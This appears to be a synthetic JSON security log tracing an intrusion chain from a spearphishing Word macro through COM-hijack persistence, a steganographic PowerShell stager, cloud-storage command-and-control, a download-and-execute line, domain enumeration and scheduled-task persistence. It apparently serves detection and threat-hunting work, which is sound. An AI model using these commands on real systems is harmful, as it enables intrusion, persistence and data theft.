[
  {
    "id": 4001,
    "host": "WIN-SRV-01",
    "user": "victim.user",
    "event_type": "spearphishing_received",
    "channel": "Signal Desktop",
    "sender": "+380*********",
    "subject": "Urgent Document Request",
    "filename": "СЛУЖБОВА_ХАРАКТЕРИСТИКА.doc",
    "description": "Spearphishing document received via Signal chat",
    "timestamp": "2025-06-21T08:32:15"
  },
  {
    "id": 4002,
    "host": "WIN-SRV-01",
    "user": "victim.user",
    "event_type": "document_opened",
    "process": "WINWORD.EXE",
    "filename": "СЛУЖБОВА_ХАРАКТЕРИСТИКА.doc",
    "description": "Malicious Word document opened by user",
    "timestamp": "2025-06-21T08:32:27"
  },
  {
    "id": 4003,
    "host": "WIN-SRV-01",
    "user": "victim.user",
    "event_type": "macro_enabled",
    "process": "WINWORD.EXE",
    "details": "User enabled macros to view document",
    "timestamp": "2025-06-21T08:32:29"
  },
  {
    "id": 4004,
    "host": "WIN-SRV-01",
    "process": "cmd.exe",
    "parent_process": "WINWORD.EXE",
    "command_line": "cmd /c reg add HKCU\\Software\\Classes\\CLSID\\{2227A280-3AEA-1069-A2DE-08002B30309D}\\InProcServer32 /d C:\\ProgramData\\prnfldr.dll /f",
    "event_type": "persistence_registry",
    "description": "COM hijack registry key created for persistence",
    "timestamp": "2025-06-21T08:32:55"
  },
  {
    "id": 4005,
    "host": "WIN-SRV-01",
    "process": "regsvr32.exe",
    "parent_process": "cmd.exe",
    "filename": "C:\\ProgramData\\prnfldr.dll",
    "event_type": "dll_registered",
    "description": "Malicious DLL registered via regsvr32",
    "timestamp": "2025-06-21T08:33:02"
  },
  {
    "id": 4006,
    "host": "WIN-SRV-01",
    "process": "explorer.exe",
    "loaded_dll": "C:\\ProgramData\\prnfldr.dll",
    "event_type": "dll_loaded",
    "description": "Malicious COM DLL loaded in explorer.exe",
    "timestamp": "2025-06-21T08:33:15"
  },
  {
    "id": 4007,
    "host": "WIN-SRV-01",
    "process": "explorer.exe",
    "file_read": "C:\\Users\\victim.user\\AppData\\Local\\windows.png",
    "event_type": "steganography_image_loaded",
    "description": "PNG steganographic payload loaded",
    "timestamp": "2025-06-21T08:33:18"
  },
  {
    "id": 4008,
    "host": "WIN-SRV-01",
    "process": "powershell.exe",
    "parent_process": "explorer.exe",
    "command_line": "powershell -enc ... HTTP Grunt Stager ...",
    "event_type": "shellcode_execution",
    "description": "Stego payload executed shellcode in PowerShell",
    "timestamp": "2025-06-21T08:33:25"
  },
  {
    "id": 4009,
    "host": "WIN-SRV-01",
    "process": "powershell.exe",
    "network_connection": {
      "destination_domain": "app.koofr.net",
      "destination_port": 443
    },
    "event_type": "c2_connection",
    "description": "HTTP Grunt C2 connected to Koofr cloud storage",
    "timestamp": "2025-06-21T08:33:40"
  },
  {
    "id": 4010,
    "host": "WIN-SRV-01",
    "event_type": "file_created",
    "filename": "Keeping/6401_.../task_1",
    "description": "Session key exchange file uploaded to C2",
    "timestamp": "2025-06-21T08:34:05"
  },
  {
    "id": 4011,
    "host": "WIN-SRV-01",
    "process": "powershell.exe",
    "event_type": "c2_polling",
    "description": "Agent polling for next tasks via Koofr API",
    "timestamp": "2025-06-21T08:34:35"
  },
  {
    "id": 4012,
    "host": "WIN-SRV-01",
    "process": "powershell.exe",
    "command_line": "Invoke‑Expression (New‑Object Net.WebClient).DownloadString(...)",
    "event_type": "remote_code_download",
    "description": "Downloaded additional module via C2 channel",
    "timestamp": "2025-06-21T08:35:10"
  },
  {
    "id": 4013,
    "host": "WIN-SRV-01",
    "process": "BeardShell.exe",
    "event_type": "backdoor_loaded",
    "description": "BeardShell C++ backdoor loaded from icedrive C2",
    "timestamp": "2025-06-21T08:36:00"
  },
  {
    "id": 4014,
    "host": "WIN-SRV-01",
    "process": "BeardShell.exe",
    "network_connection": {
      "destination_domain": "api.icedrive.net",
      "destination_port": 443
    },
    "event_type": "secondary_c2_connection",
    "description": "BeardShell connected to icedrive for commands",
    "timestamp": "2025-06-21T08:36:15"
  },
  {
    "id": 4015,
    "host": "WIN-SRV-01",
    "process": "BeardShell.exe",
    "command_executed": "SystemInfo",
    "event_type": "remote_command_execution",
    "description": "BeardShell executed remote command via C2",
    "timestamp": "2025-06-21T08:40:00"
  },
  {
    "id": 4016,
    "host": "WIN-SRV-01",
    "process": "BeardShell.exe",
    "network_connection": {
      "destination_domain": "api.icedrive.net",
      "destination_port": 443
    },
    "event_type": "data_exfiltration",
    "description": "Exfiltrated system info to icedrive",
    "timestamp": "2025-06-21T08:40:05"
  },
  {
    "id": 4017,
    "host": "WIN-SRV-01",
    "process": "wmic.exe",
    "command_line": "wmic process list brief",
    "event_type": "discovery_system",
    "description": "System enumeration by payload",
    "timestamp": "2025-06-21T08:45:00"
  },
  {
    "id": 4018,
    "host": "WIN-SRV-01",
    "process": "net.exe",
    "command_line": "net user /domain",
    "event_type": "discovery_accounts",
    "description": "Domain user enumeration",
    "timestamp": "2025-06-21T08:45:12"
  },
  {
    "id": 4019,
    "host": "WIN-SRV-01",
    "process": "net.exe",
    "command_line": "net group \"Domain Admins\" /domain",
    "event_type": "discovery_privileges",
    "description": "Domain admin group enumeration",
    "timestamp": "2025-06-21T08:45:18"
  },
  {
    "id": 4020,
    "host": "WIN-SRV-01",
    "process": "schtasks.exe",
    "command_line": "schtasks /create /tn \"PrinterUpdate\" /tr \"BeardShell.exe\" /sc minute /mo 30",
    "event_type": "persistence_scheduledtask",
    "description": "Scheduled task created for persistence",
    "timestamp": "2025-06-21T08:50:00"
  },
  {
    "id": 4021,
    "host": "WIN-SRV-01",
    "process": "reg.exe",
    "command_line": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v BeardShell ...",
    "event_type": "persistence_registry",
    "description": "Registry Run key added for BeardShell",
    "timestamp": "2025-06-21T08:50:30"
  },
  {
    "id": 4022,
    "host": "WIN-SRV-01",
    "process": "taskkill.exe",
    "command_line": "taskkill /IM explorer.exe /F",
    "event_type": "defense_evasion",
    "description": "Explorer process terminated to evade detection",
    "timestamp": "2025-06-21T08:51:02"
  }
]

